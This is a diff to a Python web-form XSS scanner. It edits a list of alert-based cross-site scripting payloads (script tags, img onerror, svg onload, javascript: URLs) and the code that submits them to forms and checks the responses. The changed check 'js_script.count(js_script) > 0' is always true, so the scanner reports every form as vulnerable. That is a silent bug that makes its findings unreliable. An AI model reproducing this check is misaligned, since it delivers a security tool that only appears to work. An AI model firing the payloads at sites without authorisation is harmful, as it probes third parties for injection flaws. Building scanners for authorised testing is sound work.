@@ -33,8 +33,8 @@ def get_all_forms_response(url):
 
         driver.quit()
         return [links, listScripts]
-    except:
-        print("[-] Get form Error!!!!!!!!!!")
+    except Exception as e:
+        print("[-] Get form Error!!!!!!!!!!",e)
         sys.stdout.flush()
 
 
@@ -111,7 +111,7 @@ def scan_xss_response(url):
         forms = get_all_forms_response(url)
         print(f"[+] Detected {len(forms[0])} forms on {url}.")
         sys.stdout.flush()
-        js_script = '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>'
+        js_script = "<script>alert(\"XSS\")</script>"
         # returning value
         is_vulnerable = False
         for form in forms[0]:
@@ -130,7 +130,7 @@ def scan_xss_response(url):
                 if(script_details is None):
                     continue  
                 contentScrip = submit_form_response(form_details, url, js_script, script_details).content.decode()
-                if js_script in contentScrip:
+                if js_script.count(js_script) > 0:
                     print(f"[+] Detected XSS on {url}")
                     print("[+] Form details:",form_details)
                     sys.stdout.flush()
@@ -207,9 +207,7 @@ def submit_form_New(driver, js_script):
       
 def scan_xss(url):
     try:
-        
         js_scripts = [
-            '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>',
             '<script>alert("XSS")</script>',
             '"><script>alert("XSS")</script>',
             '"><img src=x onerror=alert("XSS")>',
@@ -219,7 +217,6 @@ def scan_xss(url):
             '<iframe src="javascript:alert(\'XSS\');">',
             '\'"--><script>alert("XSS")</script>',
             '<img src="x" onerror="alert(\'XSS\')">',
-            '<input type="text" value="<script>alert(\'XSS\')</script>">',
             '"><svg/onload=alert(1)>',
             '"><svg/onload=alert(1)>',
             '\'><svg/onload=alert(1)>',
@@ -247,7 +244,7 @@ def scan_xss(url):
                 print(f"[+] Detected Xss on {url} By Script [+] {js_script} [+]")
                 sys.stdout.flush()
                 is_vulnerable=True
-                continue
+                break
             else :
                 print(f"[-] Not Found Xss on {url} By Script [ {js_script} ]")
                 sys.stdout.flush()
